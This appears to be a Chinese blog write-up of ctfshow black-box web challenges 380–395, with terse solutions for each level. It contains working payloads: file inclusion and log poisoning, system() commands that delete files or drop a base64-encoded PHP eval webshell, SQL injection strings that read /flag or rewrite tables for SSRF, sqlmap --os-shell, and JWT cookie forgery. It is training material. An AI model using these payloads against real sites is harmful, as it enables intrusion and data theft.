---
title: ctfshow web入门(黑盒测试)
categories: ctfshow
---
# 380
先dirsearch 扫一下 发现只有page.php可以访问

```
Notice: Undefined index: id in /var/www/html/page.php on line 16
```
打开`$id.php`失败

根据前面的`page_1.php  page_2.php page_3.php`

猜测id 为跳转的页面

后来发现使用了file_get_contents()函数

Payload：/page.php?id=flag


<!--more-->
---
# 381
访问：

![](https://img-blog.csdnimg.cn/20210702222422622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/2021070222243495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 382,383
再次访问后台，先尝试一手万能密码，直接进去

![](https://img-blog.csdnimg.cn/20210702222515146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 384
后台爆破密码
写一个字典bp跑或者直接bp设置
密码：xy123

---
# 385
扫目录

![](https://img-blog.csdnimg.cn/20210702222558506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问

![](https://img-blog.csdnimg.cn/2021070222261351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
操作之后，返回登录页面弱密码admin admin888

---
# 386

![](https://img-blog.csdnimg.cn/20210702222656267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

扫目录发现clear.php访问：

![](https://img-blog.csdnimg.cn/20210702222719996.png#pic_center)

看wp发现是传入file参数，任意文件删除

那么删除lock.dat,即可重新执行install

?file=install/lock.dat

重新访问登录即可

---
# 387
扫到/debug/传入file参数 发现可以文件包含

![](https://img-blog.csdnimg.cn/20210702222823341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问日志文件/var/log/nginx/access.log

可以将php写入UA，再将日志文件包含，执行php

查看日志发现没有写进去

![](https://img-blog.csdnimg.cn/20210702222940342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
那么直接使用系统命令删除
```
<?php system('rm /var/www/html/install/lock.dat');?>
```



还有yu师傅：
```
<?php unlink('/var/www/html/install/lock.dat');?>
```

也可以写个马儿上去
```
<?php system('echo PD9waHAgZXZhbCgkX1BPU1Rbc2hlbGxdKTs/Pg==|base64 -d > /var/www/html/cys.php');?>
```

还有bit师傅直接读取check.php
```
<?php system('cat /var/www/html/alsckdfy/check.php > /var/www/html/1.txt');?>    好思路
```


---
# 388
还是写马儿

可以看看预期解，利用editor的漏洞

---
# 389
Cookie发现jwt，爆破或者猜钥匙为123456，伪造cookie，重复上面

---
# 390
发现debug权限不足。

看文章id这里不一样了，sqlmap跑一下

![](https://img-blog.csdnimg.cn/20210702223310517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
--os-shell或者--file-read
```

---
# 391,392
注入点：
```
search.php?title=1' union select 1,2,3-- -
```
或者直接读：
```
search.php?title=1'union select 1,substr((select load_file('/flag')),1,50),3%23
```

# 393
Link.php发现id控制跳转的url，可以利用ssrf跳到/flag

![](https://img-blog.csdnimg.cn/20210702224059678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

Search.php用sqlmap跑出来`link表`和`url列`


在注入处尝试将表中数据进行更改
```
search.php?title=1';update link set url='file:///flag';
```
或者yu师傅的插入：
```
search.php?title=1';insert into link values(10,'a','file:///flag');
```

---
# 394,395
```
1';update link set url=0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870; 
```
16进制绕过

或者yu师傅，gopher打mysql

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702224301269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


